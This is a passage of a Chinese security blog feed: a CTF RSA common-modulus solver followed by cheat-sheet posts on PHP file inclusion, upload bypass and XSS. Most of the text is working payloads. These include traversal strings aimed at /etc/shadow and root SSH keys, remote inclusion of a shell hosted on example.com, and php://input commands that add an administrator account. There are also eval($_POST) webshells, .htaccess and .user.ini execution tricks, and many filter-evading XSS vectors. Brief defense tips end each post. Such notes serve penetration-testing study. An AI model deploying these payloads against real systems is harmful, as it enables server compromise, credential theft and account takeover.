title="第八题"></a>第八题</h1><p>已知<a href="veryhardRSA.rar">veryhardRSA.rar</a></p><p>首先分析加密脚本，先判断下是否够 512-11 位，不够的随机补全。<br>然后就是使用相同的 N，不同的 e,加密相同的数据，所以想到了共模攻击。</p><p>python代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">代码如下：</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">from gmpy2 import invert</span><br><span class="line">n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span><br><span class="line">def egcd(a, b):</span><br><span class="line">  <span class="keyword">if</span> a == 0:</span><br><span class="line">    <span class="built_in">return</span> (b, 0, 1)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="built_in">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">fo1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'rb'</span>)</span><br><span class="line">fo2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'rb'</span>)</span><br><span class="line">datafo1 = fo1.read()</span><br><span class="line">c1 = s2n(datafo1)</span><br><span class="line">fo1.close()</span><br><span class="line">datafo2 = fo2.read()</span><br><span class="line">c2 = s2n(datafo2)</span><br><span class="line">fo2.close()</span><br><span class="line">c2 = invert(c2,n)</span><br><span class="line">e1 = 17</span><br><span class="line">e2 = 65537</span><br><span class="line">s = egcd(e1,e2)</span><br><span class="line">s1 = s[1]</span><br><span class="line">s2 = s[2]</span><br><span class="line">s2 = - s2</span><br><span class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span> n2s(m)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;分享一些RSA题目&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="http://archimesan.me/2017/12/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://archimesan.me/2017/12/19/文件包含漏洞/</id>
    <published>2017-12-19T02:50:25.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>常见的文件包含漏洞利用</p><a id="more"></a><h1 id="文件包含漏洞介绍"><a href="#文件包含漏洞介绍" class="headerlink" title="文件包含漏洞介绍"></a>文件包含漏洞介绍</h1><p>PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>最常见的就属于本地文件包含（Local File Inclusion）漏洞了。<br>我们来看下面一段 index.php 代码:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'func'</span>]) &#123;</span><br><span class="line">   include <span class="variable">$_GET</span>[<span class="string">'func'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   include <span class="string">'default.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序的本意可能是当提交 url 为 <a href="http://example.com/index.php?func=add.php时，调用" target="_blank" rel="noopener">http://example.com/index.php?func=add.php时，调用</a> add.php 里面的样式内容和功能。直接访问 <a href="http://example.com/index.php" target="_blank" rel="noopener">http://example.com/index.php</a> 则会包含默认的 default.php<br>那么问题来了，如果我们提交<a href="http://example.com/index.php?func=upload/pic/evil.jpg" target="_blank" rel="noopener">http://example.com/index.php?func=upload/pic/evil.jpg</a> ，且 evil.jpg 是由黑客上传到服务器上的一个图片，在图片的末尾添加了恶意的 php 代码，那么恶意的代码就会被引入当前文件执行。</p><h2 id="普通本地文件包含"><a href="#普通本地文件包含" class="headerlink" title="普通本地文件包含"></a>普通本地文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="string">"inc/"</span> . <span class="variable">$_GET</span>[<span class="string">'file'</span>]); ?&gt;</span><br></pre></td></tr></table></figure><p>1）、包含同目录下的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=.htaccess</span><br></pre></td></tr></table></figure></p><p>2）、目录遍历：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/lib/locate.db</span><br><span class="line">?file=../../../../../../../../../var/lib/mlocate/mlocate.db</span><br><span class="line">（linux 中这两个文件储存着所有文件的路径，需要 root 权限）</span><br></pre></td></tr></table></figure></p><p>3）、包含错误日志：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/<span class="built_in">log</span>/apache/error.log （试试把UA设置为<span class="string">""</span>来使 payload 进入日志）</span><br></pre></td></tr></table></figure></p><p>4）、获取 web 目录或者其他配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../usr/<span class="built_in">local</span>/apache2/conf/httpd.conf</span><br></pre></td></tr></table></figure></p><p>5）、包含上传的附件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../attachment/media/xxx.file</span><br></pre></td></tr></table></figure></p><p>6）、读取 session 文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</span><br><span class="line">（session 文件一般在 /tmp 目录下，格式为 sess_[your phpsessid value]，有时候也有可能在 /var/lib/php5 之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值，也许你能够获得一个 shell）</span><br></pre></td></tr></table></figure></p><p>7）、如果拥有 root 权限还可以试试读这些东西：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.keystore</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/shadow</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]* (文件标识符)</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/config.gz</span><br></pre></td></tr></table></figure></p><h2 id="有限制的本地文件包含"><a href="#有限制的本地文件包含" class="headerlink" title="有限制的本地文件包含"></a>有限制的本地文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="string">"inc/"</span> . <span class="variable">$_GET</span>[<span class="string">'file'</span>] . <span class="string">".htm"</span>); ?&gt;</span><br></pre></td></tr></table></figure><p>1）、%00 截断：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd%00</span><br><span class="line">(需要 magic_quotes_gpc=off，PHP 小于 5.3.4 有效)</span><br></pre></td></tr></table></figure></p><p>2）、%00 截断目录遍历：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/www/%00</span><br><span class="line">(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</span><br></pre></td></tr></table></figure></p><p>3）、路径长度截断：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</span><br><span class="line">(php 版本小于 5.2.8(?)可以成功，linux 需要文件名长于 4096，windows 需要长于 256)</span><br></pre></td></tr></table></figure></p><p>4）、点号截断：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../boot.ini/………[…]…………</span><br><span class="line">(php 版本小于 5.2.8(?)可以成功，只适用 windows，点号需要长于 256)</span><br></pre></td></tr></table></figure></p><h2 id="普通远程文件包含"><a href="#普通远程文件包含" class="headerlink" title="普通远程文件包含"></a>普通远程文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="variable">$_GET</span>[<span class="string">'file'</span>]); ?&gt;</span><br></pre></td></tr></table></figure><p>1）、远程代码执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=[http|https|ftp]://example.com/shell.txt</span><br><span class="line">(需要 allow_url_fopen=On 并且 allow_url_include=On)</span><br></pre></td></tr></table></figure></p><p>2）、利用 php 流 input：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br><span class="line">&lt;?php system(<span class="string">'whoami'</span>);?&gt;</span><br><span class="line">&lt;?php system(<span class="string">'net user zks zks123 /add'</span>);?&gt;</span><br><span class="line">&lt;?php system(<span class="string">'net localgroup administrators zks /add'</span>);?&gt; </span><br><span class="line">(需要 allow_url_include=On，详细→http://php.net/manual/en/wrappers.php.php)</span><br></pre></td></tr></table></figure></p><p>3）、利用 php 流 filter：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p><img src="1.jpeg" alt></p><p>4）、利用 data URIs：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">&lt;?php phpinfo();  注意没有&gt;闭合 有就无法执行</span><br><span class="line">(需要allow_url_include=On)</span><br></pre></td></tr></table></figure></p><p>5）、利用 XSS 执行任意代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=http://127.0.0.1/path/xss.php?xss=phpcode</span><br><span class="line">(需要 allow_url_fopen=On，allow_url_include=On 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)</span><br></pre></td></tr></table></figure></p><p>6）、phar 协议</p><p>phar 是将 php 文件归档到一个文件包里面(我理解是类似与 zip 压缩包一样)创建 phar 的时候要注意 php.ini 的参数,phar.readonly 设置为 off（本地测试的两个默认都是 off）<br>此方法使用要 php&gt;5.3.0<br>首先上传一个包含有一句话木马的压缩包，通过伪协议解析其中的木马文件<br>第一步木马生成压缩包     &lt;?php @eval($_POST[1]);?&gt;<br>第二步将压缩包上传<br>第三步解析压缩包中的文件</p><p><img src="2.jpeg" alt></p><p>利用 zip 或 phar 伪协议读取压缩包中的文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/about.php?f=phar://./images/1499394959.jpg/1.php</span><br><span class="line">/about.php?f=zip://./images/1499394959.jpg%231.php</span><br></pre></td></tr></table></figure></p><p>上传webshell完成</p><h2 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="variable">$_GET</span>[<span class="string">'file'</span>] . <span class="string">".htm"</span>); ?&gt;</span><br><span class="line">?file=http://example.com/shell</span><br><span class="line">?file=http://example.com/shell.txt?</span><br><span class="line">?file=http://example.com/shell.txt%23</span><br><span class="line">(需要 allow_url_fopen=On 并且 allow_url_include=On)</span><br><span class="line">?file=\evilshare\shell.php (只需要 allow_url_include=On)</span><br></pre></td></tr></table></figure><h1 id="文件包含漏洞防御："><a href="#文件包含漏洞防御：" class="headerlink" title="文件包含漏洞防御："></a>文件包含漏洞防御：</h1><p>设置 open_basedir 将用户可操作的文件限制在某目录下</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的文件包含漏洞利用&lt;/p&gt;
    
    </summary>
    
    
      <category term="常见漏洞" scheme="http://archimesan.me/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文件上传绕过</title>
    <link href="http://archimesan.me/2017/12/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
    <id>http://archimesan.me/2017/12/18/文件上传绕过/</id>
    <published>2017-12-18T02:07:36.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>常见的文件上传绕过归纳</p><a id="more"></a><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>1）、绕过 JavaScript 代码检测</p><p>一般情况下 选择文件还没点击上传 就出错<br>直接用 burpsuite 抓包 上传 jpg 后缀改成 php 后缀即可</p><p>2）、MIME 类型绕过</p><p>上传 php 后缀  改 Content-Type 即可  改成图片类型 image/jpeg  image/gif</p><p>3）、目录路径检测</p><p>%00 截断   通过抓包截断将 evil.php.jpg 后面的一个.换成 0x00<br>或者通过抓包将 evil.php .gif 后面的空格改成 00 即可</p><p>example:</p><p><img src="1.png" alt></p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p>4）、文件扩展名检测绕过（黑名单）</p><p>文件大小写 Asp phP ASASPP phphpp<br>Asp: asa cer cdx<br>Aspx: ashx<br>PHP: php3、php4、php5、phtml、pht</p><p>5）、文件内容检测</p><p>头文件加 GIF89a 后面加一句话，其他名字可以改成 php。或者直接在一个正常的 gif 后面加一句话<br>6）、上传覆盖 .htaccess 文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"x.jpg"</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p><p>然后在相同目录下上传 x.jpg  就可以解析 php 了。</p><p>或者<br>后面就上传了一个 .htaccess 文件里面只有一句。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .abc</span><br></pre></td></tr></table></figure></p><p>之后，把 php 后门改成 xx.abc 上传上去就可以执行了。</p><p>7）、上传.user.ini</p><p>如果文件夹下有<br>Index.php  .user.ini  1.gif<br>我们在 .user.ini 里面写入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=/tmp/01.gif</span><br></pre></td></tr></table></figure></p><p>在 1.gif 写入 php 一句话  这样访问 php 文件即可  不需要重启 apache</p><p>修改 php.ini<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=/tmp/01.gif   不过需要重启apache服务器</span><br></pre></td></tr></table></figure></p><p>8）、配合文件包含漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="string">'x.jpg'</span>);?&gt;</span><br><span class="line">x.jpg写入一句话&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;  即可<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>9）、解析漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">01、 IIS 6.0</span><br><span class="line">shell.asp;1.jpg</span><br><span class="line">shell.asp/1.jpg</span><br><span class="line">02、IIS 7 or Nginx</span><br><span class="line">shell.jpg/x.php</span><br><span class="line">shell.jpg%00.php</span><br><span class="line">03、Apache2</span><br><span class="line">shell.php.bak</span><br><span class="line">Shell.php.rar</span><br></pre></td></tr></table></figure></p><p>10）、其他绕过</p><p>01.上传 123.php:jpg，会生成 123.php 空文件，然后上传 123.&lt;&lt;&lt;，即可覆盖 123.php，把 Shell 内容写入 123.php 文件。</p><p>02.直接上传 Shell.php::$DATA</p><p>03.用 Burpsuite 拦截 将上传文件名改成 Shell.php%81 即可。</p><h2 id="上传漏洞防护"><a href="#上传漏洞防护" class="headerlink" title="上传漏洞防护"></a>上传漏洞防护</h2><p>1）、文件上传的目录设置为不可执行</p><p>只要 web 容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p><p>2）、判断文件类型</p><p>在判断文件类型时，可以结合使用 MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者 resize 函数，在处理图片的同时破坏图片中可能包含的 HTML 代码。</p><p>3）、使用随机数改写文件名和文件路径</p><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像 shell.php.rar.rar 和 crossdomain.xml 这种文件，都将因为重命名而无法攻击。</p><p>4）、单独设置文件服务器的域名</p><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传 crossdomain.xml、上传包含 Javascript 的 XSS 利用等问题将得到解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的文件上传绕过归纳&lt;/p&gt;
    
    </summary>
    
    
      <category term="常见漏洞" scheme="http://archimesan.me/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XSS归纳</title>
    <link href="http://archimesan.me/2017/12/17/XSS%E5%BD%92%E7%BA%B3/"/>
    <id>http://archimesan.me/2017/12/17/XSS归纳/</id>
    <published>2017-12-17T01:23:15.000Z</published>
    <updated>2019-03-22T07:03:56.806Z</updated>
    
    <content type="html"><![CDATA[<p>常见的 xss 归纳</p><a id="more"></a><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><p>1）、反射型<br>2）、存储型<br>3）、dom-xss</p><h1 id="突破xss的防御"><a href="#突破xss的防御" class="headerlink" title="突破xss的防御"></a>突破xss的防御</h1><p>关键字过滤 关键字不允许 关键字转义</p><h2 id="常规插入"><a href="#常规插入" class="headerlink" title="常规插入"></a>常规插入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(String.fromCharCode</span><br><span class="line">(97, 108, 101, 114, 116, 40, 47, 88, 83, 83, 47, 41))&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><h2 id="script-被过滤"><a href="#script-被过滤" class="headerlink" title="script 被过滤"></a>script 被过滤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(/xss/)&lt;/Script&gt;   </span><br><span class="line">&lt;scRiPt&gt;alert(/xss/);&lt;/scrIPt&gt;</span><br><span class="line">&lt;audio src=x onerror=prompt(1);&gt;  </span><br><span class="line">&lt;audio/src=x onerror=prompt(1);&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/XSS/)&lt;/scr&lt;script&gt;ipt&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;  </span><br><span class="line">&lt;img/src=aaa.jpg onerror=prompt(1)&gt;</span><br><span class="line">&lt;video src=x onerror=prompt(1);&gt; </span><br><span class="line">&lt;video/src=x onerror=prompt(1);&gt;</span><br></pre></td></tr></table></figure><h2 id="on-标签"><a href="#on-标签" class="headerlink" title="on 标签"></a>on 标签</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div onclick=<span class="string">"alert(/xss/)"</span>&gt;  </span><br><span class="line">&lt;div onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;div onclick =<span class="string">"alert(/xss/)"</span>&gt;  多一个空格  </span><br><span class="line">&lt;svg/onload=prompt(1);&gt;</span><br><span class="line">&lt;textarea autofocus onfocus=alert(1)&gt;</span><br><span class="line">onload   onmouseenter  onmouseup  onmousedown  onmousemove</span><br><span class="line">onmouseout  onmouseover  onmouseleave  onkeydown  onkeypress  onkeyup</span><br></pre></td></tr></table></figure><h2 id="常见的绕过"><a href="#常见的绕过" class="headerlink" title="常见的绕过"></a>常见的绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;q/oncut=alert(1)&gt; //    </span><br><span class="line">&lt;a href=<span class="string">"javascript:alert(1)"</span>&gt;Clickme&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;   </span><br><span class="line">&lt;body/onpageshow=alert(1);&gt;</span><br><span class="line">&lt;q/oncut=\u0061lert(1)&gt; //  </span><br><span class="line">&lt;%0ascript&gt;alert(1);&lt;/script&gt;</span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;  </span><br><span class="line">&lt;iframe src=<span class="string">"javascript:alert(2)"</span>&gt;  </span><br><span class="line">&lt;a href=<span class="string">"javascr ipt:alert(1);"</span>&gt;click&lt;/a&gt;   </span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;  </span><br><span class="line">&lt;a href=<span class="string">"javasc ript:alert(1);"</span>&gt;click&lt;/a&gt;</span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="base64-编码绕过"><a href="#base64-编码绕过" class="headerlink" title="base64 编码绕过"></a>base64 编码绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe/src=<span class="string">"data:text/html; base64 ,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg== "</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="隐藏标签绕过"><a href="#隐藏标签绕过" class="headerlink" title="隐藏标签绕过"></a>隐藏标签绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uid=1 accesskey=x onclick=<span class="string">"alert(1)"</span> //  火狐浏览器 alt <span class="built_in">shift</span> + x 同时按可以触发</span><br><span class="line">uid=<span class="string">"test"</span> <span class="built_in">type</span>=<span class="string">"text"</span> onfocus=<span class="string">"alert(1)"</span> autofocus a=<span class="string">""</span>//  <span class="built_in">type</span> 在 value 后面才行</span><br><span class="line">example：</span><br><span class="line">&lt;form&gt;</span><br><span class="line"> First name:&lt;br&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"firstname"</span> value=<span class="string">""</span>accesskey=x onclick=<span class="string">"alert(1)"</span> //<span class="string">"&gt;</span></span><br><span class="line"><span class="string"> Last name:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input name="</span>lastname<span class="string">" value="</span><span class="built_in">test</span><span class="string">" type="</span>text<span class="string">" onfocus="</span>alert(1)<span class="string">" autofocus a="</span><span class="string">" type="</span>hidden<span class="string">"// </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure><h1 id="xss-防护"><a href="#xss-防护" class="headerlink" title="xss 防护"></a>xss 防护</h1><p>1）、控制输入输出 过滤一些关键字</p><p>诸如 alert script prompt img src on 等。</p><p>2）、对一些特殊字符进行转义<br>诸如将 “ , ‘ , &amp; ,&lt; ,&gt; 等转化为 HTML 实体。</p><p>预定义字符如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; 转义为 &amp;amp</span><br><span class="line"><span class="string">" 转义为 &amp;quot</span></span><br><span class="line"><span class="string">' 转义为 &amp;#039</span></span><br><span class="line"><span class="string">&lt; 转义为 &amp;lt</span></span><br><span class="line"><span class="string">&gt; 转义为 &amp;gt</span></span><br></pre></td></tr></table></figure></p><p>3）、最好是设置白名单</p><p>规定哪些标签、哪些字符可以输出。</p><p>4）、设置 HttpOnly</p><p>虽然它对 xss 漏洞不起作用，但是能够防止后期的 cookie 劫持攻击。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的 xss 归纳&lt;/p&gt;
    
    </summary>
    
    
